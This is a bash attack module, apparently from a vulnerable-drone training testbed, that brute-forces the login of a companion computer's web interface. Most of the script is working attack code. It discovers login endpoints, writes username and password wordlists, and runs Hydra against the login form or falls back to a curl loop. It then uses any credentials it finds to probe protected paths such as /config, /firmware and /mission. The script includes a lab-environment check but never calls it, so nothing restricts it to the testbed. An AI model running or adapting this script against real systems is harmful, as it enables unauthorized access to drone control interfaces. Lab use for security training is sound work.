#!/bin/bash
# web_ui_bruteforce.sh - Companion Computer Web UI Login Brute Force Attack Module
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/injection/web_ui_bruteforce.sh
# Purpose: Execute password brute force attacks on companion computer web interface using Hydra

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Companion Computer Web UI Login Brute Force"
TARGET_IP="${TARGET_IP:-127.0.0.1}"
WEB_PORT="${WEB_PORT:-3000}"
LOG_FILE="$(get_log_dir)/injection/web_ui_bruteforce_$(date +%Y%m%d_%H%M%S).log"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}  Companion Computer Web UI Brute Force    ${NC}"
    echo -e "${CYAN}============================================${NC}"
    echo -e "${YELLOW}Target: ${TARGET_IP}:${WEB_PORT}${NC}"
    echo ""
}

check_target() {
    log_info "Checking target web interface..."
    
    if ! nc -z "$TARGET_IP" "$WEB_PORT" 2>/dev/null; then
        log_error "Web service not accessible at ${TARGET_IP}:${WEB_PORT}"
        return 1
    fi
    
    log_success "Web interface accessible"
    return 0
}

discover_login_form() {
    log_info "Discovering login form..."
    
    local endpoints=("/login" "/admin" "/auth" "/signin" "/" "/index.html")
    
    for endpoint in "${endpoints[@]}"; do
        local url="http://${TARGET_IP}:${WEB_PORT}${endpoint}"
        local response=$(curl -s "$url" --connect-timeout 5 2>/dev/null)
        
        if echo "$response" | grep -qi "password\|login\|username"; then
            log_success "Login form found at: $endpoint"
            echo "$endpoint"
            return 0
        fi
    done
    
    log_warning "No login form found, using /login"
    echo "/login"
}

create_wordlists() {
    log_info "Creating wordlists..."
    
    # Username list
    cat > /tmp/userlist.txt << 'EOF'
admin
administrator
root
pilot
drone
operator
user
guest
maintenance
dvd
companion
cyberdrone
service
manager
supervisor
webadmin
sysadmin
EOF

    # Password list focused on DVD/drone context
    cat > /tmp/passlist.txt << 'EOF'
admin
password
cyberdrone
admin123
drone
pilot
dvd123
companion
123456
password123
root
default
test
demo
guest
service
maintenance
operator
qwerty
abc123
letmein
welcome
mavlink
ardupilot
px4
sitl
gazebo
mission
flight
control
ground
takeoff
land
rtl
armed
disarm
manual
auto
guided
stabilize
loiter
althold
acro
circle
brake
throw
followme
smart_rtl
position
drift
sport
flip
autotune
guided_nogps
avoid_adsb
zigzag
systemid
heli_autorotate
auto_rtl
flowhold
simple
super_simple
EOF

    log_success "Wordlists created: $(wc -l < /tmp/userlist.txt) users, $(wc -l < /tmp/passlist.txt) passwords"
}

execute_hydra_attack() {
    local endpoint="$1"
    
    log_info "Starting Hydra brute force attack..."
    
    if ! command -v hydra >/dev/null 2>&1; then
        log_warning "Hydra not found, using manual brute force..."
        manual_bruteforce "$endpoint"
        return $?
    fi
    
    # Real Hydra attack
    log_info "Executing Hydra attack on ${TARGET_IP}:${WEB_PORT}${endpoint}"
    
    hydra -L /tmp/userlist.txt -P /tmp/passlist.txt "$TARGET_IP" http-post-form \
        "${endpoint}:username=^USER^&password=^PASS^:Invalid" \
        -s "$WEB_PORT" -t 16 -w 30 -f -q | tee -a "$LOG_FILE"
    
    local result=${PIPESTATUS[0]}
    
    if [ $result -eq 0 ]; then
        log_success "Hydra attack completed - check output for credentials"
    else
        log_warning "Hydra attack finished without finding credentials"
    fi
    
    return $result
}

manual_bruteforce() {
    local endpoint="$1"
    local found_creds=false
    
    log_info "Manual brute force attack starting..."
    
    # High-probability combinations first
    local priority_creds=(
        "admin:admin"
        "admin:password"
        "admin:cyberdrone"
        "admin:admin123"
        "admin:dvd123"
        "pilot:pilot"
        "drone:drone"
        "root:root"
        "cyberdrone:cyberdrone"
        "companion:companion"
        "dvd:dvd"
        "operator:operator"
        "service:service"
        "guest:guest"
    )
    
    echo -e "${YELLOW}[*] Testing high-priority credential combinations...${NC}"
    
    for cred in "${priority_creds[@]}"; do
        local username=$(echo "$cred" | cut -d':' -f1)
        local password=$(echo "$cred" | cut -d':' -f2)
        
        if test_login "$endpoint" "$username" "$password"; then
            log_success "CREDENTIALS FOUND: $username:$password"
            found_creds=true
            
            # Test access to protected areas
            test_authenticated_access "$username" "$password"
            break
        fi
        
        sleep 0.5  # Rate limiting
    done
    
    if [ "$found_creds" = false ]; then
        echo -e "${YELLOW}[*] Testing common combinations...${NC}"
        
        # Read from wordlists for comprehensive test
        while IFS= read -r username; do
            while IFS= read -r password; do
                if test_login "$endpoint" "$username" "$password"; then
                    log_success "CREDENTIALS FOUND: $username:$password"
                    found_creds=true
                    test_authenticated_access "$username" "$password"
                    break 2
                fi
                sleep 0.2
            done < /tmp/passlist.txt
            
            # Test top 5 passwords for each user to avoid excessive requests
            head -5 /tmp/passlist.txt | while IFS= read -r password; do
                if test_login "$endpoint" "$username" "$password"; then
                    log_success "CREDENTIALS FOUND: $username:$password"
                    break
                fi
            done
            
        done < /tmp/userlist.txt
    fi
    
    if [ "$found_creds" = true ]; then
        return 0
    else
        log_warning "No credentials found"
        return 1
    fi
}

test_login() {
    local endpoint="$1"
    local username="$2"
    local password="$3"
    
    local url="http://${TARGET_IP}:${WEB_PORT}${endpoint}"
    local post_data="username=${username}&password=${password}"
    
    local response=$(curl -s -X POST \
        -d "$post_data" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -c /tmp/cookies_${username}.txt \
        --connect-timeout 5 \
        "$url" 2>/dev/null)
    
    # Check for success indicators
    if echo "$response" | grep -qi "dashboard\|welcome\|home\|main\|profile\|logout\|admin\|success"; then
        return 0
    fi
    
    # Check for redirect (302)
    local headers=$(curl -s -I -X POST \
        -d "$post_data" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --connect-timeout 5 \
        "$url" 2>/dev/null)
    
    if echo "$headers" | grep -q "302\|Location:"; then
        return 0
    fi
    
    # Check for absence of error messages
    if ! echo "$response" | grep -qi "invalid\|error\|fail\|wrong\|incorrect\|denied"; then
        # If we get a response without error messages, it might be success
        if [ -n "$response" ] && [ ${#response} -gt 100 ]; then
            return 0
        fi
    fi
    
    return 1
}

test_authenticated_access() {
    local username="$1"
    local password="$2"
    
    log_info "Testing authenticated access for $username..."
    
    local protected_paths=(
        "/dashboard"
        "/admin"
        "/config"
        "/settings"
        "/system"
        "/api"
        "/status"
        "/users"
        "/logs"
        "/control"
        "/mission"
        "/telemetry"
        "/camera"
        "/gimbal"
        "/parameters"
        "/calibration"
        "/firmware"
        "/network"
    )
    
    local accessible_count=0
    
    for path in "${protected_paths[@]}"; do
        local test_url="http://${TARGET_IP}:${WEB_PORT}${path}"
        
        local response=$(curl -s -b "/tmp/cookies_${username}.txt" \
            --connect-timeout 3 \
            "$test_url" 2>/dev/null)
        
        if [ $? -eq 0 ] && [ -n "$response" ]; then
            if ! echo "$response" | grep -qi "unauthorized\|forbidden\|login\|error"; then
                if echo "$response" | grep -qi "html\|json\|xml\|config\|parameter\|mission\|status"; then
                    log_success "  ✓ Access granted to: $path"
                    accessible_count=$((accessible_count + 1))
                fi
            fi
        fi
    done
    
    if [ $accessible_count -gt 0 ]; then
        log_success "Successfully accessed $accessible_count protected endpoints"
    else
        log_warning "No additional protected areas accessible"
    fi
}

# Check for DVD environment
is_dvd_environment() {
    if docker ps 2>/dev/null | grep -q "dvd\|drone"; then
        return 0
    fi
    
    if ip addr show | grep -q "192.168.13\|10.13.0"; then
        return 0
    fi
    
    return 1
}

cleanup() {
    rm -f /tmp/userlist.txt /tmp/passlist.txt /tmp/cookies_*.txt 2>/dev/null
}

main() {
    print_attack_banner
    
    # Check root
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # Check tools
    if ! check_required_tools curl nc; then
        log_error "Missing required tools: curl, nc"
        exit 1
    fi
    
    # Check target
    if ! check_target; then
        exit 1
    fi
    
    # Initialize logging
    mkdir -p "$(dirname "$LOG_FILE")"
    echo "=== Web UI Brute Force Attack Started at $(date) ===" > "$LOG_FILE"
    
    # Discover login endpoint
    local login_endpoint=$(discover_login_form)
    
    # Create wordlists
    create_wordlists
    
    echo ""
    log_info "Starting brute force attack on ${TARGET_IP}:${WEB_PORT}${login_endpoint}"
    echo ""
    
    # Execute attack
    if execute_hydra_attack "$login_endpoint"; then
        log_success "Attack completed successfully"
    else
        log_warning "Attack completed without success"
    fi
    
    # Cleanup
    cleanup
    
    echo ""
    log_success "Web UI brute force attack finished"
    echo "Log file: $LOG_FILE"
    
    exit 0
}

# Signal handlers
trap cleanup EXIT
trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup; exit 1' INT TERM

# Execute if called directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi